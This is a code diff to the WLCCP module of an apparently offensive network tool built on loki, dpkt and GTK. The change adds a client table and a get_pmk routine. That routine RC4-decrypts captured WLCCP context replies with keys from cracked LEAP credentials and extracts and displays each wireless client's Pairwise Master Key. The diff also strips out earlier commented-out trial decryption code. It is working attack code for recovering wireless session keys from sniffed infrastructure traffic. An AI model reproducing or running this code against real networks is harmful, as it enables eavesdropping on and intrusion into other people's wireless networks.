@@ -47,7 +47,7 @@ import dpkt
 
 import loki
 
-DEBUG = True
+DEBUG = False
 
 class wlccp_header(object):
     def __init__(self, version=None, sap=None, dst_type=None, msg_type=None, id=None, flags=None, orig_node_type=None, orig_node_mac=None, dst_node_type=None, dst_node_mac=None):
@@ -163,6 +163,10 @@ class mod_class(object):
     HOSTS_HOST_ROW = 0
     HOSTS_TYPE_ROW = 1
     HOSTS_PRIO_ROW = 2
+
+    CLIENTS_HOST_ROW = 0
+    CLIENTS_SSID_ROW = 1
+    CLIENTS_PMK_ROW = 2
     
     COMMS_HOST_ROW = 0
     COMMS_TYPE_ROW = 1
@@ -194,6 +198,7 @@ class mod_class(object):
         self.name = "wlccp"
         self.gladefile = "/modules/module_wlccp.glade"
         self.hosts_liststore = gtk.ListStore(str, str, str)
+        self.clients_liststore = gtk.ListStore(str, str, str)
         self.comms_treestore = gtk.TreeStore(str, str, str, str)
         self.dnet = None
         self.election_thread = None
@@ -221,6 +226,10 @@ class mod_class(object):
         self.hosts_treeview.set_model(self.hosts_liststore)
         self.hosts_treeview.set_headers_visible(True)
 
+        self.clients_treeview = self.glade_xml.get_widget("clients_treeview")
+        self.clients_treeview.set_model(self.clients_liststore)
+        self.clients_treeview.set_headers_visible(True)
+
         self.comms_treeview = self.glade_xml.get_widget("comms_treeview")
         self.comms_treeview.set_model(self.comms_treestore)
         self.comms_treeview.set_headers_visible(True)
@@ -243,6 +252,25 @@ class mod_class(object):
         column.pack_start(render_text, expand=True)
         column.add_attribute(render_text, 'text', self.HOSTS_PRIO_ROW)
         self.hosts_treeview.append_column(column)
+        
+        column = gtk.TreeViewColumn()
+        column.set_title("Host")
+        render_text = gtk.CellRendererText()
+        column.pack_start(render_text, expand=True)
+        column.add_attribute(render_text, 'text', self.CLIENTS_HOST_ROW)
+        self.clients_treeview.append_column(column)
+        column = gtk.TreeViewColumn()
+        column.set_title("SSID")
+        render_text = gtk.CellRendererText()
+        column.pack_start(render_text, expand=True)
+        column.add_attribute(render_text, 'text', self.CLIENTS_SSID_ROW)
+        self.clients_treeview.append_column(column)
+        column = gtk.TreeViewColumn()
+        column.set_title("PMK")
+        render_text = gtk.CellRendererText()
+        column.pack_start(render_text, expand=True)
+        column.add_attribute(render_text, 'text', self.CLIENTS_PMK_ROW)
+        self.clients_treeview.append_column(column)
 
         column = gtk.TreeViewColumn()
         column.set_title("Hosts")
@@ -469,19 +497,17 @@ class mod_class(object):
                         if id_type == self.NODE_TYPE_CLIENT:
                             client = dnet.eth_ntoa(id[2:])
                             if client in self.clients:
-                                (org_host, ssid, key_mgmt, ap, crypt, msc, pmk) = self.clients[client]
+                                (iter, org_host, ssid, key_mgmt, ap, crypt, msc, pmk) = self.clients[client]
                                 #get Destination-ID from WLCCP_MN_SECURE_CONTEXT_REQ
                                 ap = dnet.eth_ntoa(ret[10:16])
                                 crypt = ret[24:contextreq_len]
-
-                                print crypt.encode("hex")
-                                
                                 #skip WLCCP_MN_SECURE_CONTEXT_REPLY
                                 ret = ret[contextreq_len:]
                                 #get Message Sequence Counter from WLCCP_MIC
                                 msc = ret[4:12]
-                                self.clients[client] = (org_host, ssid, key_mgmt, ap, crypt, msc, pmk)
+                                self.clients[client] = (iter, org_host, ssid, key_mgmt, ap, crypt, msc, pmk)
                                 self.log("WLCCP: PREREGISTRATION-REPLY seen for %s" % client)
+                                self.get_pmk(client)
                 else:
                     #PreRegistration_Request found
                     if host in self.comms:
@@ -501,10 +527,11 @@ class mod_class(object):
                                 (ssid_len,) = struct.unpack("!H", ret[68:70])
                                 ssid = ret[70:70 + ssid_len]
                                 if client not in self.clients:
-                                    self.clients[client] = (None, ssid, key_mgmt, None, None, None, None)
+                                    iter = self.clients_liststore.append([client, ssid, ""])
+                                    self.clients[client] = (iter, None, ssid, key_mgmt, None, None, None, None)
                                 else:
-                                    (org_host, org_ssid, org_key_mgmt, ap, crypt, msc, pmk) = self.clients[client]
-                                    self.clients[client] = (host, ssid, key_mgmt, ap, crypt, msc, pmk)
+                                    (iter, org_host, org_ssid, org_key_mgmt, ap, crypt, msc, pmk) = self.clients[client]
+                                    self.clients[client] = (iter, host, ssid, key_mgmt, ap, crypt, msc, pmk)
                                 self.log("WLCCP: PREREGISTRATION-REQUEST seen for %s on ssid %s" % (client, ssid))
                             else:
                                 if DEBUG:
@@ -597,8 +624,20 @@ class mod_class(object):
         else:
             self.log("WLCCP: Can't verify CTK mic for connection %s, none found." % connection.replace('\n       <=>\n', ' <=> '))
         self.log("WLCCP: Found CTK %s for connection %s" % (ctk.encode("hex"), connection.replace('\n       <=>\n', ' <=> ')))
-        
         return ctk
+
+    def get_pmk(self, client):
+        if client in self.clients:
+            (iter, host, ssid, key_mgmt, ap, crypt, msc, pmk) = self.clients[client]
+            if host in self.comms:
+                (iter2, leap, leap_pw, nsk, nonces, ctk) = self.comms[host]
+                if crypt and msc and ctk:
+                    decrypt = self.rc4crypt("\0" * 256 + crypt, msc + ctk[:16])[256:]
+                    #print decrypt.encode("hex")
+                    pmk = decrypt[38:70]
+                    self.clients_liststore.set(iter, self.CLIENTS_PMK_ROW, pmk.encode("hex"))
+                    self.log("WLCCP: Got PMK %s for client %s on SSID %s" % (pmk.encode("hex"), client, ssid))
+                    self.clients[client] = (iter, host, ssid, key_mgmt, ap, crypt, msc, pmk)
 
     def on_crack_leap_button_clicked(self, btn):
         select = self.comms_treeview.get_selection()
@@ -632,62 +671,10 @@ class mod_class(object):
                         self.comms_treestore.append(iter, [ "CTK", ctk.encode("hex"), "", "" ])
                         self.comms[host] = (iter, (leap_auth_chall, leap_auth_resp, leap_supp_chall, leap_supp_resp), pw, nsk, nonces, ctk)
 
-                    #~ for client in self.clients:
-                        #~ (c_host, ssid, key_mgmt, ap, crypt, msc, pmk) = self.clients[client]
-                        #~ if c_host == host or True:
-#~ 
-                            #~ # b1) offset
-                            #~ # a1) plain RC4
-                            #~ print "1"
-                            #~ decrypt = self.rc4crypt(key_mgmt + crypt, msc + ctk[:16])
-                            #~ print decrypt.encode("hex")
-                            #~ # a2) RC4 mit 256 BIT key stream zu beginn discarden
-                            #~ print "2"
-                            #~ decrypt = self.rc4crypt("\0" * 16 + key_mgmt + crypt, msc + ctk[:16])[16:]
-                            #~ print decrypt.encode("hex")
-                            #~ # a3) RC4 mit 256 BYTE key stream zu beginn discarden
-                            #~ print "3"
-                            #~ decrypt = self.rc4crypt("\0" * 256 + key_mgmt + crypt, msc + ctk[:16])[256:]
-                            #~ print decrypt.encode("hex")
-#~ 
-                            #~ # b2) offset + 4
-                            #~ print "1a"
-                            #~ decrypt = self.rc4crypt(key_mgmt + crypt[4:], msc + ctk[:16])
-                            #~ print decrypt.encode("hex")
-                            #~ # a2) RC4 mit 256 BIT key stream zu beginn discarden
-                            #~ print "2a"
-                            #~ decrypt = self.rc4crypt("\0" * 16 + key_mgmt + crypt[4:], msc + ctk[:16])[16:]
-                            #~ print decrypt.encode("hex")
-                            #~ # a3) RC4 mit 256 BYTE key stream zu beginn discarden
-                            #~ print "3a"
-                            #~ decrypt = self.rc4crypt("\0" * 256 + key_mgmt + crypt[4:], msc + ctk[:16])[256:]
-                            #~ print decrypt.encode("hex")
-#~ 
-                            #~ # b3) offset + 32
-                            #~ print "1b"
-                            #~ decrypt = self.rc4crypt(key_mgmt + crypt[32:], msc + ctk[:16])
-                            #~ print decrypt.encode("hex")
-                            #~ # a2) RC4 mit 256 BIT key stream zu beginn discarden
-                            #~ print "2b"
-                            #~ decrypt = self.rc4crypt("\0" * 16 + key_mgmt + crypt[32:], msc + ctk[:16])[16:]
-                            #~ print decrypt.encode("hex")
-                            #~ # a3) RC4 mit 256 BYTE key stream zu beginn discarden
-                            #~ print "3b"
-                            #~ decrypt = self.rc4crypt("\0" * 256 + key_mgmt + crypt[32:], msc + ctk[:16])[256:]
-                            #~ print decrypt.encode("hex")
-#~ 
-                            #~ # b4) offset + 36
-                            #~ print "1c"
-                            #~ decrypt = self.rc4crypt(key_mgmt + crypt[36:], msc + ctk[:16])
-                            #~ print decrypt.encode("hex")
-                            #~ # a2) RC4 mit 256 BIT key stream zu beginn discarden
-                            #~ print "2c"
-                            #~ decrypt = self.rc4crypt("\0" * 16 + key_mgmt + crypt[36:], msc + ctk[:16])[16:]
-                            #~ print decrypt.encode("hex")
-                            #~ # a3) RC4 mit 256 BYTE key stream zu beginn discarden
-                            #~ print "3c"
-                            #~ decrypt = self.rc4crypt("\0" * 256 + key_mgmt + crypt[36:], msc + ctk[:16])[256:]
-                            #~ print decrypt.encode("hex")
+                    for client in self.clients:
+                        (iter, c_host, ssid, key_mgmt, ap, crypt, msc, pmk) = self.clients[client]
+                        if c_host == host:
+                            self.get_pmk(client)
                 else:
                     self.log("WLCCP: Password for %s not found." % connection.replace('\n       <=>\n', ' <=> '))
 
